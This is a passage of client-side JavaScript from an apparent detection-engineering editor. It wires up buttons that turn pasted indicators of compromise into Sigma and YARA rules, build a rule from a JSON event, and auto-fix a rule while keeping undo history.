          const name = `${title.replace(/['"]/g, "").toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 60) || "converted_query"}.yml`;
          closeDrawer();
          loadText(name, last.yaml);
          toast("Rule loaded. Check it, then save.", "ok");
          return;
        }
        if (e.target.closest("#iocGo")) {
          const textIn = $("#iocText", panel).value.trim();
          if (!textIn) {
            toast("Paste some IOCs first", "bad");
            return;
          }
          $("#iocOut", panel).innerHTML = '<div class="skeleton sk-block"></div>';
          try {
            lastIoc = await api.iocRules(textIn, $("#iocName", panel).value.trim());
            const c = lastIoc.counts;
            const chips = Object.entries(c).filter(([, n]) => n).map(([k, n]) => `<span class="chip">${n} ${esc(k)}</span>`).join("");
            $("#iocOut", panel).innerHTML = `
              <div class="chips">${chips}</div>
              ${lastIoc.skipped.length ? `<div class="notice notice--warn mt-4">Skipped ${lastIoc.skipped.length} values that are not IOCs: ${esc(lastIoc.skipped.slice(0, 8).join(", "))}${lastIoc.skipped.length > 8 ? "..." : ""}</div>` : ""}
              <div class="card mt-4"><ul class="list">${lastIoc.sigma.map((r, i) => `<li class="list__item"><div class="list__main"><div class="list__title">${esc((r.content.match(/^title:\s*(.+)$/m) || [])[1] || r.name)}</div><div class="list__meta mono">${esc(r.name)}</div></div><button class="btn btn--sm" type="button" data-iocopen="${i}">Open</button></li>`).join("")}${lastIoc.yara ? `<li class="list__item"><div class="list__main"><div class="list__title">YARA rules for the same IOCs</div><div class="list__meta mono">${esc(lastIoc.yara.name)}</div></div><span class="badge badge--accent">YARA</span></li>` : ""}</ul></div>
              <div class="row mt-4"><div class="spacer"></div>${lastIoc.yara ? `<button class="btn" type="button" id="iocYara">${icons.grid} Save YARA file</button>` : ""}<button class="btn btn--primary" type="button" id="iocAdd">${icons.file} Add ${esc(plural(lastIoc.sigma.length, "rule"))} to workspace</button></div>`;
          } catch (err) {
            $("#iocOut", panel).innerHTML = `<div class="notice notice--bad">${esc(err.message)}</div>`;
          }
          return;
        }
        const iocOpen = e.target.closest("[data-iocopen]");
        if (iocOpen && lastIoc) {
          const r = lastIoc.sigma[Number(iocOpen.dataset.iocopen)];
          closeDrawer();
          loadText(r.name, r.content);
          return;
        }
        if (e.target.closest("#iocAdd") && lastIoc) {
          const added = await store.add(lastIoc.sigma.map((r) => ({ name: `iocs/${r.name}`, content: r.content })));
          toast(`Added ${plural(added, "rule")} to the workspace`, "ok");
          return;
        }
        if (e.target.closest("#iocYara") && lastIoc?.yara) {
          const { yaraStore } = await import("./yarakit.js");
          yaraStore.upsert({ name: lastIoc.yara.name, content: lastIoc.yara.content });
          toast(`Saved ${lastIoc.yara.name} to your YARA rules`, "ok");
          return;
        }
        if (e.target.closest("#feGo")) {
          let ev;
          try {
            ev = JSON.parse($("#feText", panel).value);
          } catch (err) {
            toast(`Not valid JSON: ${err.message}`, "bad");
            return;
          }
          if (!ev || typeof ev !== "object" || Array.isArray(ev)) {
            toast("Paste one JSON object", "bad");
            return;
          }
          ruleFromEvent(ev, ev.logsource || null);
        }
      });
    });
  });

  $("#edFix", root).addEventListener("click", async (e) => {
    if (!text.value.trim()) return;
    const btn = e.currentTarget;
    btn.disabled = true;
    try {
      const res = await api.autofix(text.value, file().name);
      if (!res.changed) {
        toast("Nothing to fix", "ok");
        return;
      }
      pushHistory(file().name, text.value, "before auto fix");
      setText(res.content);
      paintGutter();
      paintHistCount();
      refresh();
      openDrawer(`Auto fix, ${plural(res.changes.length, "change")}`, `<p class="muted">The old text is kept in History, so you can undo this.</p><div class="card mt-4"><ul class="list">${res.changes.map((c) => `<li class="list__item"><div class="list__main">${esc(c)}</div></li>`).join("")}</ul></div>`);
    } catch (err) {
      toast(err.message, "bad");
    } finally {
      btn.disabled = false;
    }
  });

  paintHistCount();
  paintTestCount();
  paintGutter();
  $("#edChecks", root).innerHTML = forging("Checking the rule");
  try {
    [targets, attack] = await Promise.all([state.targets(), state.attack().catch(() => null)]);
    fillTargets();
  } catch (err) {
    toast(err.message, "bad");
  }
  if (route.tab) $(`#edTabs [data-tab="${route.tab}"]`, root)?.click();
  refresh();
  opts.onChange?.(openedId, nameInput.value);
  return {
    destroy() {
      saveDraft();
      offReview();
    },
    async open(f) {
      if (f.id === openedId && f.name === nameInput.value) return;
      const before = (await state.rules()).find((r) => r.id === openedId);
      if (text.value.trim() && (!before || before.content !== text.value)) pushHistory(file().name, text.value, "unsaved, before opening another file");
      loadText(f.name, f.content, f.id);
      trackState({ file: f.name });
    },
    current: () => ({ id: openedId, name: nameInput.value }),
  };
}
